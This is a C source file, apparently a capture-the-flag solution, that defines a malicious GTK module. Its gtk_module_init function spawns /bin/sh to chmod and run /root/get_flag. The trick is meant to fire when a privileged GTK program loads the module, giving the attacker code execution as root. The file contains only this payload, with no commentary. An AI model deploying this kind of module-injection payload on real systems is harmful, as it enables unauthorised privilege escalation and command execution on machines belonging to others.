#include <unistd.h>
#include <gtk/gtk.h>

void gtk_module_init(gint *argc, gchar ***argv[]) {
    char *args[] = {"/bin/sh", "-c", "chmod +x /root/get_flag; /root/get_flag", NULL};
    execve(args[0], args, NULL);
}
